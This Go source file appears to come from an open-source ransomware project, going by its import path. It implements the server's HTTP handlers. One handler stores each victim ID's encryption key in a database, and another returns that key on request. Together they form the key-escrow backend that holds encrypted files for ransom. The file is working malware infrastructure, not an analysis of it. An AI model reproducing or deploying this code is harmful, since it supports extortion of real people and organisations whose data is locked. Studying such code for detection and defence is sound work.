package main

import (
	"encoding/json"
	"fmt"
	"net/http"

	"github.com/labstack/echo"
	"github.com/mauri870/ransomware/repository"
)

func addKeys(c echo.Context) error {
	// Get the payload from context
	payload := c.Get("payload").([]byte)

	// Parse the json keys
	keys, err := parseJsonKeys(payload)
	if err != nil {
		// Bad Json
		return c.JSON(http.StatusBadRequest, ApiResponseBadJson)
	}

	// If nothing goes wrong, persist the keys...
	db := repository.Open(Database)
	defer db.Close()

	available, err := db.IsAvailable(keys["id"], "keys")
	if err != nil && err != repository.ErrorBucketNotExists {
		return c.JSON(http.StatusInternalServerError, ApiResponseInternalError)
	}

	if available || err == repository.ErrorBucketNotExists {
		err = db.CreateOrUpdate(keys["id"], keys["enckey"], "keys")
		if err != nil {
			return c.JSON(http.StatusInternalServerError, "")
		}

		// Success \o/
		return c.NoContent(http.StatusNoContent)
	}

	// Id already exists
	return c.JSON(http.StatusConflict, ApiResponseDuplicatedId)
}

func getEncryptionKey(c echo.Context) error {
	id := c.Param("id")
	if len(id) != 32 {
		return c.JSON(http.StatusBadRequest, ApiResponseBadRequest)
	}

	// If nothing goes wrong, try get the encryption key...
	db := repository.Open(Database)
	defer db.Close()

	enckey, err := db.Find(id, "keys")
	if err != nil {
		return c.JSON(http.StatusTeapot, ApiResponseResourceNotFound)
	}

	return c.JSON(http.StatusOK, fmt.Sprintf(`{"status": 200, "enckey": "%s"}`, enckey))
}

// Parse the json keys
func parseJsonKeys(body []byte) (map[string]string, error) {
	var keys map[string]string
	if err := json.Unmarshal(body, &keys); err != nil {
		return keys, err
	}

	return keys, nil
}
